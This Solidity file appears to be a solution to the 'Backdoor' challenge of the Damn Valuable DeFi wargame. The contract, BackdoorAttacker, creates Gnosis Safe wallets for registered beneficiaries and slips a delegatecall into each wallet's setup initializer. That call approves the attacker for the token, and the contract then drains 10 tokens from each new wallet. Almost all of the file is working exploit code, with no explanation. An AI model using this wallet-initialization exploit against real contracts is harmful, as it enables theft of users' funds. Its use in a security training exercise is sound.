// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

/// @notice Import Token contract to call approve 
import "../../DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

contract BackdoorAttacker {
    address private masterCopy;
    address private walletFactory;
    address private registryAddress;
    address private immutable tokenAddress;

    constructor(address _masterCopy, address _walletFactory, address _registryAddress, address _tokenAddress){
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        registryAddress = _registryAddress;
        tokenAddress = _tokenAddress;
    }

    function delegateApprove(address attackerContract) external {
        /// @notice: this will be called by the Gnosis Safe wallet proxy
        DamnValuableToken(tokenAddress).approve(attackerContract, 10 ether);
    }

    function attack(address[] calldata _beneficiaries) external {
 
        for(uint256 i =0; i < 4; i++){
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];
            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                beneficiary,
                1,
                address(this),
                abi.encodeWithSignature("delegateApprove(address)",address(this)),
                address(0), 0, 0 ,0
            );

            GnosisSafeProxy walletProxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
                masterCopy,
                initializer,
                0,
                IProxyCreationCallback(registryAddress)
                );
            DamnValuableToken(tokenAddress).transferFrom(address(walletProxy), msg.sender, 10 ether);
        }
            
    }
    

}